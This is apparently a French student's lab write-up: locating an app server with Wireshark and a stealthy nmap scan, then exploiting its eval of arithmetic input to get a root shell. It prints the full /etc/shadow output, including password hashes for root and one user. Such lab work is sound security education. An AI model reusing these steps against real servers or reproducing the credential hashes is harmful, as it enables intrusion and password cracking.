# TP5 SECU : Exploit, pwn, fix

🌞 Déterminer

- à quelle IP ce client essaie de se co quand on le lance
- à quel port il essaie de se co sur cette IP
```
Internet Protocol Version 4, Src: 10.33.74.119, Dst: 10.1.1.2
Destination Port: 13337
```

🌞 Scanner le réseau

- trouvez une ou plusieurs machines qui héberge une app sur ce port
- votre scan nmap doit être le plus discret possible : il ne teste que ce port là, rien d'autres
- testez d'abord dans un réseau avec des VMs


```
sudo nmap -sS -p 13337 10.33.64.0/20 > Bureau/reseau/scan.txt 

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: E4:B3:18:48:36:68 (Intel Corporate)
```

🌞 Connectez-vous au serveur

- éditer le code du client pour qu'il se connecte à la bonne IP et au bon port
- utilisez l'application !
- vous devez déterminer, si c'est pas déjà fait, à quoi sert l'application

```
Pour retrouver l'ip de connexion au serveur nous cherchons sur wireshark l'adresse mac ayant le port 13337 ouvert avec cette commande : eth.dst == E4-B3-18-48-36-68
IP trouvée : 10.33.66.78
```

```
L'application sert à réaliser des opérations arithmétique.
```

## 2. Exploit

🌞 Injecter du code serveur

- démerdez-vous pour arriver à faire exécuter du code arbitraire au serveur
- tu sais comment te co au serveur, et tu sais que ce que tu lui envoies, il l'évalue
- vous pouvez normalement avoir une injection de code :

- exécuter du code Python
et normalement, exécuter des  
- commandes shell depuis cette injection Python

cat etc/shadow
root:$6$atP4CieUTrEFXHsk$XKnowYr3fH1wS/ROSrPilmXL5mkUZPK0xlZ3KN2v0FZ2T/ndSxTzqjeqsWuRKZl5nFlXuFtdQvhQnLLm/XFLB1::0:99999:7:::
bin:*:19469:0:99999:7:::
daemon:*:19469:0:99999:7:::
adm:*:19469:0:99999:7:::
lp:*:19469:0:99999:7:::
sync:*:19469:0:99999:7:::
shutdown:*:19469:0:99999:7:::
halt:*:19469:0:99999:7:::
mail:*:19469:0:99999:7:::
operator:*:19469:0:99999:7:::
games:*:19469:0:99999:7:::
ftp:*:19469:0:99999:7:::
nobody:*:19469:0:99999:7:::
systemd-coredump:!!:19653::::::
dbus:!!:19653::::::
tss:!!:19653::::::
sssd:!!:19653::::::
sshd:!!:19653::::::
chrony:!!:19653::::::
systemd-oom:!*:19653::::::
noah:$6$sdPZ9tJBSUK6uKXY$LmZemdiomYbtMpg2IMzhIFedU3abEU5PEzHhpV/TRTtTDY./bO3HBHmzqhA2E49joYzkF6Lcq.glzS.QeApHx1::0:99999:7:::
tcpdump:!!:19653::::::
netdata:!!:20020::::::
sh-5.1# 
